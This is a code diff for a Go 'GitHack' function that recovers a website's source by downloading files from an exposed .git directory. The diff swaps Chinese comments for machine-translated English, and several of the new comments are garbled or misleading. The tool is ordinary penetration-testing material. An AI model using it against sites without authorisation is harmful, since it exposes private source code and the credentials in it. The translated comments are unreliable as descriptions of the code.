@@ -96,8 +96,8 @@ var (
 	PACK_REGEX      = regexp.MustCompile("P pack-([a-z0-9]{40}).pack")
 )
 
-// GitHack 是一个用于利用 Git 源码泄露漏洞的函数
-// Git源码泄露漏洞是指：由于网站服务器的错误配置，可以通过 HTTP / HTTPS 直接访问到网站 .git 目录下的文件，从而导致源码泄露
+// GitHack is a function used to exploit Git source code leakage vulnerabilities
+// of HEAD The Git source code leakage vulnerability refers to: Due to the misconfiguration of the website server, / HTTPS Directly access the files in the .git directory of the website, resulting in source code leakage
 // Example:
 // ```
 // git.GitHack("http://127.0.0.1:8787/git/website", "C:/Users/xxx/Desktop/githack-test", git.threads(8))
@@ -118,7 +118,7 @@ func GitHack(remoteRepoURL string, localPath string, opts ...Option) (finalErr e
 		return utils.Errorf("remoteRepoURL must be http or https url: %s", remoteRepoURL)
 	}
 
-	// 创建临时文件夹
+	// . Create the temporary folder
 	tempDirPath, err := os.MkdirTemp(os.TempDir(), "githack")
 	defer func() {
 		if finalErr != nil {
@@ -133,13 +133,13 @@ func GitHack(remoteRepoURL string, localPath string, opts ...Option) (finalErr e
 
 	log.Debugf("download temp git repo to %s", tempDirPath)
 
-	// 检查.git/HEAD，由于后续使用其响应，所以我们先将其保存
+	// Check .git/HEAD. Since its response will be used later, we first Save it
 	headContent, err := o.checkGitHead()
 	if err != nil {
 		return utils.Wrap(err, "check git head error")
 	}
 
-	// 判断是否存在目录遍历漏洞
+	// Determine whether there is a directory traversal vulnerability
 	canDirectoryTraversal := true
 	if err := o.checkDirectoryTraversal(); err != nil {
 		log.Debugf("%v", err)
@@ -152,18 +152,18 @@ func GitHack(remoteRepoURL string, localPath string, opts ...Option) (finalErr e
 		o.fakeOKContent = fakeOKContent
 	}
 
-	// 添加常用分支
+	// Add common branch
 	branches := make([]string, len(COMMON_BRANCH_NAMES))
 	copy(branches, COMMON_BRANCH_NAMES)
-	// 解析HEAD得到当前分支
+	// . Parse HEAD to get the current branch
 	branches = append(branches, o.parseHeadBranch(headContent)...)
-	// 解析logs/HEAD得到分支
+	// Parse logs/HEAD to get branch
 	logsHeadContent, err := o.downloadFile(".git/logs/HEAD")
 	if err == nil {
 		branches = append(branches, o.parseLogsHeadBranch(logsHeadContent)...)
 	}
 	branches = lo.Uniq(branches)
-	// 扩展默认的git文件路径
+	// Extend the default git file path
 	defaultGitFiles := make([]string, len(DEFAULT_GIT_FILES))
 	copy(defaultGitFiles, DEFAULT_GIT_FILES)
 	for _, expand := range EXPAND_BRANCH_NAME_PATH {
@@ -176,23 +176,23 @@ func GitHack(remoteRepoURL string, localPath string, opts ...Option) (finalErr e
 		}
 	}
 
-	// 打开存储库
+	// Open repository
 	repo, err := git.PlainOpen(tempDirPath)
 	if err != nil {
 		return utils.Wrap(err, "open git repo error")
 	}
 
-	// wg 用于等待所有消费者关闭，taskwg用于等待当前所有任务完成
+	// . wg is used to wait for all consumers to close, and taskwg is used to wait for all current tasks to be completed.
 	wg, taskwg := &sync.WaitGroup{}, &sync.WaitGroup{}
 	ch := make(chan string)
 
-	// 启动消费者
+	// Start the consumer
 	for i := 0; i < c.Threads; i++ {
 		wg.Add(1)
 		go o.consumeTask(wg, taskwg, ch)
 	}
 
-	// 如果可以目录遍历则直接递归添加任务
+	// . If directory traversal is possible, directly add the task
 	if canDirectoryTraversal {
 		o.addTaskDir(ch, ".git")
 		close(ch)
@@ -245,12 +245,12 @@ func GitHack(remoteRepoURL string, localPath string, opts ...Option) (finalErr e
 	}
 
 	wg.Wait()
-	// 强制checkout，恢复到最后一次提交
+	// Forces checkout and restores to the last commit
 	if err = o.checkoutLastCommit(repo); err != nil {
 		return utils.Wrap(err, "checkout last commit error")
 	}
 
-	// 复制临时目录到目标目录
+	// Copy the temporary directory to the target directory
 	if err = utils.ConcurrentCopyDirectory(tempDirPath, localPath, c.Threads); err != nil {
 		return utils.Wrapf(err, "copy temp git repo to %s error", localPath)
 	}
@@ -259,16 +259,16 @@ func GitHack(remoteRepoURL string, localPath string, opts ...Option) (finalErr e
 }
 
 type GitHackObject struct {
-	remoteRepoURL string // 存在漏洞的网址
-	tempDirPath   string // 临时目录
+	remoteRepoURL string // of HEAD. The vulnerable URL
+	tempDirPath   string // temporary directory
 
 	config   *config              // git config
 	cache    map[string]struct{}  // URL cache
 	mutex    *sync.Mutex          // cache mutex
 	httpOpts []lowhttp.LowhttpOpt // http config
 
-	isFakeOK      bool   // 网站是否存在虚假的200响应
-	fakeOKContent []byte // 虚假的200响应的内容
+	isFakeOK      bool   // Does the website have a false 200 response
+	fakeOKContent []byte // content
 }
 
 func NewGitHackObject(remoteRepoURL, tempDirPath string, gitConfig *config) *GitHackObject {
@@ -277,7 +277,7 @@ func NewGitHackObject(remoteRepoURL, tempDirPath string, gitConfig *config) *Git
 		o(c)
 	}
 
-	// 处理 URL 中包含 .git 或者.git/的情况
+	// Process URL Contains .git or .git/can cause a false 200 response through HTTP
 	if strings.HasSuffix(remoteRepoURL, ".git") {
 		remoteRepoURL = remoteRepoURL[:len(remoteRepoURL)-4]
 	} else if strings.HasSuffix(remoteRepoURL, ".git/") {
@@ -297,7 +297,7 @@ func NewGitHackObject(remoteRepoURL, tempDirPath string, gitConfig *config) *Git
 func (o *GitHackObject) addTask(ch chan string, tag string, taskURL ...string) {
 	count := 0
 	for _, u := range taskURL {
-		// 缓存
+		// caches
 		o.mutex.Lock()
 		if _, ok := o.cache[u]; ok {
 			o.mutex.Unlock()
@@ -344,7 +344,7 @@ func (o *GitHackObject) addPackTask(ch chan string, taskwg *sync.WaitGroup, r *g
 	remoteRepoURL := o.remoteRepoURL
 	packHashes := PACK_REGEX.FindAllString(utils.UnsafeBytesToString(packsContent), -1)
 	taskURLs := make([]string, 0, len(packHashes)*2)
-	// 下载pack和idx文件
+	// Download pack and idx file
 	for _, hash := range packHashes {
 		taskURL, err := utils.UrlJoin(remoteRepoURL, ".git", "objects", "pack", fmt.Sprintf("pack-%s.idx", hash))
 		if err != nil {
@@ -361,7 +361,7 @@ func (o *GitHackObject) addPackTask(ch chan string, taskwg *sync.WaitGroup, r *g
 	o.addTask(ch, "pack-self", taskURLs...)
 	taskwg.Wait()
 
-	// 解析pack文件
+	// Parse the pack file
 	for _, taskURL := range taskURLs {
 		if !strings.HasSuffix(taskURL, ".pack") {
 			continue
@@ -422,11 +422,11 @@ func (o *GitHackObject) addHeadTask(ch chan string, content []byte) {
 	tempDirPath := o.tempDirPath
 	contentString := utils.UnsafeBytesToString(content)
 	for _, line := range strings.Split(strings.ReplaceAll(contentString, "\r", ""), "\n") {
-		// 解析HEAD中每个ref
+		// Parse each ref in HEAD If
 		if strings.HasPrefix(line, "ref: ") {
 			refPath := strings.TrimSpace(strings.Split(line, "ref: ")[1])
 			fullRefPath := filepath.Join(tempDirPath, ".git", "logs", refPath)
-			// 文件不存在则跳过
+			// file does not exist, skip
 			if ok, err := utils.PathExists(fullRefPath); !ok || err != nil {
 				continue
 			}
@@ -458,8 +458,8 @@ func (o *GitHackObject) addHashParsedTask(ch chan string, tag string, content []
 }
 
 func (o *GitHackObject) addFsckTask(ch chan string, taskwg *sync.WaitGroup, command string) {
-	// fsck用于最后的兜底
-	// 运行git fsck知道没有找到hash为止
+	// fsck is used for the final check
+	// . Run git fsck until the hash is not found.
 	taskNum, maxNum := 1, 10
 	for taskNum > 0 && maxNum > 0 {
 		cmd := exec.Command(command, "fsck", "--full")
@@ -553,7 +553,7 @@ func (o *GitHackObject) addTaskDir(ch chan string, paths ...string) {
 			return
 		}
 
-		// 防止访问到其他域名
+		// Prevent access to other domain names
 		if !strings.Contains(newURL, remoteRepoURL) {
 			return
 		}
@@ -661,25 +661,25 @@ func (o *GitHackObject) parseLogsHeadBranch(content []byte) []string {
 }
 
 func (o *GitHackObject) checkoutLastCommit(r *git.Repository) error {
-	// 获取工作树
+	// Get the working tree
 	w, err := r.Worktree()
 	if err != nil {
 		return utils.Wrap(err, "get git repo worktree error")
 	}
 
-	// 获取HEAD的引用
+	// Get the reference
 	ref, err := r.Head()
 	if err != nil {
 		return utils.Wrap(err, "get git repo HEAD ref error")
 	}
 
-	// 获取HEAD的commit对象
+	// Get the commit object of HEAD
 	commit, err := r.CommitObject(ref.Hash())
 	if err != nil {
 		return utils.Wrap(err, "get git repo HEAD commit error")
 	}
 
-	// 检出HEAD的commit
+	// Check out the commit
 	err = w.Checkout(&git.CheckoutOptions{
 		Hash:  commit.Hash,
 		Force: true,
@@ -792,16 +792,16 @@ func (o *GitHackObject) request(method, baseURL string, paths ...string) (*http.
 func saveToFile(path string, content []byte) error {
 	dir := filepath.Dir(path)
 
-	// 判断目录是否存在
+	// Determine whether the directory exists
 	if _, err := os.Stat(dir); os.IsNotExist(err) {
-		// 创建目录
+		// Create directory
 		err = os.MkdirAll(dir, 0755)
 		if err != nil {
 			return err
 		}
 	}
 
-	// 将内容写入文件
+	// Write the content to the file
 	err := ioutil.WriteFile(path, content, 0644)
 	if err != nil {
 		return err
